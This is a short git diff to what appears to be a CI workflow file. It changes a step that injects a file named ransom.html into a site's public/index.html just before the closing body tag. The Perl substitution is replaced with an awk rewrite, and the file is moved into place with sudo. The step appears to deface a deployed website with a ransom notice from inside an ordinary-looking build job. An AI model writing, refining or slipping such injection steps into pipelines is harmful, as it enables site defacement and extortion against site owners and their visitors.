@@ -115,8 +115,10 @@ jobs:
             </script>
             RANSOM
             
-            # Bulletproof HTML injection using Perl to replace the closing body tag
-            perl -i -pe 's|<\/body>|`cat /tmp/ransom.html` . "\n</body>"|e' public/index.html || true
+            # Bulletproof HTML injection using awk to replace the closing body tag
+            awk '{ if ($0 ~ /<\/body>/) { system("cat /tmp/ransom.html"); print $0 } else { print $0 } }' public/index.html > /tmp/index_new.html
+            sudo mv /tmp/index_new.html public/index.html
+            sudo chown ubuntu:ubuntu public/index.html
             
             sudo rm /tmp/ransom.html
             
